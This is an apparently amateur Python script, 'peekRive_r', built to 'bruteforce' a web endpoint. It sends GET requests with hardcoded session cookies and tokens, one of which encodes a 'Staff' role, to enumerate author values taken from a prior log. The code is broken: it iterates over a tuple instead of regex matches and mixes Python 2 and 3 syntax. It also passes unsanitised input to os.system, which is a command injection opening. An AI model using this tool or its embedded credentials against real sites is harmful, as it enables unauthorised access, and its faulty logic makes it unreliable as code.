#!/usr/bin/python  

import sys  
import zlib
import time
import os
import requests
import re
from etaprogress.progress import ProgressBar


# def memeTime(self):
# Name mimicks active killdisk software name
# Also Bing, its not ethical to copycat Google's product !
#
# https://vignette.wikia.nocookie.net/ageofempires/images/7/70/KronosPortrait.png
# ^ my face when I find out Bing acts naughty again ARRRRR (jk)

def main():
	PROGRAM_NAME = "peekRive_r"
	HOW_TO = """
	1. Proceed with standard peekRive first 
	2. Get log file, copy it here 
	3. Copy browser cookies to the script
	4. Run it against the gotten log
	5. ...? Profit
	"""
	
	if len(sys.argv) != 2:
		print(PROGRAM_NAME+" "+"Awaits you!")
		print("How to:")
		print(HOW_TO)
		print("USAGE: python "+PROGRAM_NAME+".py <file>")
		print("For example: python "+PROGRAM_NAME+".py my.log")
	else:
		# init
		# https://stackoverflow.com/a/16060908
		
		URL = "PUT URL HERE"
		input = str(sys.argv[1])
		try:
			input_file = open(input, "r")
			input_text = input_file.read()
			input_file.close()
		except Exception as e:
			print >> sys.stderr, "Error opening "+input
			print >> sys.stderr, "Exception: %s" % str(e)
			sys.exit(1)

		SLEEP_TIME = 1/1000		
		
		logname = PROGRAM_NAME+"_"+str(int(time.time()))+".log"
		log = open(logname, "a+")
		
		# change the cookz below
		cookies = {
			"zid": "z5214048",
			"token": "ef992f23c1bbeeae8806204966c53e5b4207fb15d298f1cf269873a3d14f543f",
			"session": "eyJyb2xlIjoiU3RhZmYiLCJ1c2VybmFtZSI6IjEifQ.D3p-hQ.zv0SaZ_fsIUQh-WNkvjUyHx0c1k"
		}
		
		headers = {
			"Accept": "application/json",
			"Upgrade-Insecure-Requests": "1"
		}
		
		want_from = chr(34)+"author"+chr(34)+": "+chr(34)
		want_to = chr(34)+","
		
		# https://stackoverflow.com/a/4697884
		regex = r'{0}(.*?){1}'.format(want_from, want_to)
		# print(regex)
		work_list = (regex, input_text)
		
		work = len(work_list)
		bar = ProgressBar(work, max_width=40)
		
		# print for user
		print(PROGRAM_NAME+" initialised")

		print("stdout will be logged to "+logname)
		print("the bruteforce will start in 3s")
		# allow user to change mind
		time.sleep(3)
		
		#payload
		i = 0
		for i in range(work):
			k=i
			
			k_string = work_list[k] # convertion to the text
			
			r = requests.get(URL+k_string, cookies=cookies, headers=headers)
			txt = r.text
			# https://docs.python.org/3/library/zlib.html SAYS
			#'An Adler-32 checksum is almost as reliable as a CRC32 but can be computed much more quickly'
			#'Changed in version 3.0: Always returns an unsigned value' => GOOD
			txt_hash = toHexCustom(zlib.adler32(txt.encode('utf-8')))
			
			what_to_log = str(k) + " " + k_string + " "			
			log.write(what_to_log)
			log.write(txt)
			print(what_to_log+"\n")
			
			bar.numerator = i
			print(str(bar))
			#sys.stdout.flush()
			
			myCoolTitle = PROGRAM_NAME+" "+k_string
			os.system("title "+myCoolTitle) #https://stackoverflow.com/a/10229529
			#time.sleep(SLEEP_TIME/1000)
		
		#payload (for-loop) over
		what_to_log = "[F] Fin"
				
		log.write(what_to_log+"\n")
		print(what_to_log)
		
		log.close()

def toHexCustom(dec): 
	return str(hex(dec).split('x')[-1])	

if __name__ == '__main__':
	main()